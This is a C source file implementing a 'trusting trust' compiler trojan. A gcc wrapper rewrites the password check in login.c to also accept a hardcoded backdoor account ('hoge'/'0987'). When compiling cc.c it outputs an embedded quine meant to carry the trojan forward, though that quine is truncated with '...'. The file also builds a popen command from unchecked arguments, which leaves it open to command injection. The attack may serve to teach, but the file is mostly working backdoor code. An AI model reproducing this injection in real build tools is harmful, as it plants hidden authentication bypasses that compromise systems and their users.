#include <stdio.h>
#include <string.h>
#include <stdarg.h>

char *quine = 
    "#include <stdio.h>\n"
    "#include <string.h>\n"
    "#include <stdarg.h>\n"
    "\n"
    "char *quine = \n"
    "    \"#include <stdio.h>\\n\"\n"
    "    \"#include <string.h>\\n\"\n"
    "    \"#include <stdarg.h>\\n\"\n"
    "    \"\\n\"\n"
    "    \"char *quine = ...;\\n\";\n"
    "\n"
    "char *backdoor_usrname = \"hoge\";\n"
    "char *backdoor_pass = \"0987\";\n"
    "\n"
    "int main(int argc, char const *argv[]) {\n"
    "    FILE *src_file;\n"
    "    char line[256];\n"
    "\n"
    "    if (argc < 2) return 1;\n"
    "    src_file = fopen(argv[1], \"r\");\n"
    "    if (src_file == NULL) return 1;\n"
    "\n"
    "    FILE *pipe = popen(\"gcc -x c -\", \"w\");\n"
    "    if (pipe == NULL) {\n"
    "        fclose(src_file);\n"
    "        return 1;\n"
    "    }\n"
    "\n"
    "    while (fgets(line, sizeof(line), src_file) != NULL) {\n"
    "        if ((strcmp(argv[1], \"login.c\") == 0) && (strstr(line, \"strcmp(pass,PASSWORD)\") != NULL)) {\n"
    "            fprintf(pipe, \"if ((strcmp(user, USERNAME) == 0 && strcmp(pass, PASSWORD) == 0) || (strcmp(user, \\\"%s\\\") == 0 && strcmp(pass, \\\"%s\\\") ==0)){\\n\", backdoor_usrname, backdoor_pass);\n"
    "        }\n"
    "        else if (strcmp(argv[1], \"cc.c\") == 0) {\n"
    "            fprintf(pipe, \"%s\", quine);\n"
    "            break;\n"
    "        }\n"
    "        else {\n"
    "            fprintf(pipe, \"%s\", line);\n"
    "        }\n"
    "    }\n"
    "    pclose(pipe);\n"
    "    fclose(src_file);\n"
    "    return 0;\n"
    "}\n";




FILE *src_file; 
char line[256];
char *backdoor_usrname = "hoge";
char *backdoor_pass = "0987";

int main(int argc,char const *argv[]){
char cmd[256];

src_file = fopen(argv[1],"r"); //input file
snprintf(cmd, sizeof(cmd), "gcc -x c - %s %s", (argc > 2 ? argv[2] : ""), (argc > 3 ? argv[3] : ""));
FILE *pipe = popen(cmd, "w");

if (pipe == NULL){
	printf("command failed");
	return 1;

}
while (fgets(line, sizeof(line), src_file) != NULL){

	if((strcmp(argv[1],"login.c")==0) && strstr(line ,"strcmp(pass,PASSWORD)" ) != NULL){
	fprintf(pipe, 
			"if ((strcmp(user, USERNAME) == 0 && strcmp(pass, PASSWORD) == 0) || (strcmp(user, \"%s\") == 0 && strcmp(pass, \"%s\") ==0)){\n", backdoor_usrname, backdoor_pass);

	}else if(strcmp(argv[1],"cc.c") == 0){
	fprintf(pipe, "%s", quine);
	break;
}else{


fprintf(pipe, "%s", line);
}
}
pclose(pipe);
fclose(src_file);
return 0;
}
